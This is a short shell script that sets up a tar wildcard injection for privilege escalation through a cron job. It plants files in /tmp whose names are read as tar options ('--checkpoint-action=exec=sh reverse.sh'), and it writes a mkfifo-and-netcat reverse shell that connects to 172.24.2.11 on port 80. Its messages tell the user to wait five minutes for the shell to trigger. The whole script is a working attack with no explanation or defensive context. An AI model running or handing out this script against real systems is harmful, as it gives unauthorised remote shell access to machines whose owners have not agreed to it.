echo "Setting up tar command injection via cronjob"
cd /tmp;
touch -- --checkpoint=1;
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.24.2.11 80 >/tmp/f' > reverse.sh;
chmod +x reverse.sh;
touch -- '--checkpoint-action=exec=sh reverse.sh';
echo "Setup is complete, wait for 5 minutes for reverse shell to trigger"
 
